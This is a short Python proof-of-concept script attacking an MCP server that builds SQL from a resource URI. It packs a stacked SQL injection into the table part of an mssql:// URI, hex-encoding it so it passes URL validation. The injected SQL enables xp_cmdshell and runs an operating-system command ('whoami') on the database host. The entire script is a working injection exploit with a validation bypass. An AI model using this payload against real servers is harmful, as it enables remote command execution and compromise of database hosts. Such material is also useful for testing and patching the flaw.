from mcp.types import ReadResourceRequestParams

# SQL we want the stacked query to run (has spaces - fine, it gets hex-encoded):
inner_sql = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
             "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
             "INSERT INTO pwned EXEC xp_cmdshell 'whoami'")
# SQL Server reads 0x.. varbinary as the SQL string when passed to EXEC()
hexsql = "0x" + inner_sql.encode("utf-16-le").hex()
table_payload = f"products;EXEC({hexsql})--"
uri = f"mssql://{table_payload}/data"

print("inner_sql:", inner_sql)
print("uri len:", len(uri))
try:
    p = ReadResourceRequestParams(uri=uri)
    s = str(p.uri)
    parts = s[8:].split('/'); table = parts[0]
    final_sql = f"SELECT TOP 100 * FROM {table}"
    print("VALIDATION: OK (passes MCP AnyUrl)")
    print("server-side FINAL SQL (truncated):", final_sql[:90], "...")
    print("has space in payload:", ' ' in table)
except Exception as e:
    print("VALIDATION FAIL:", type(e).__name__, str(e)[:140])
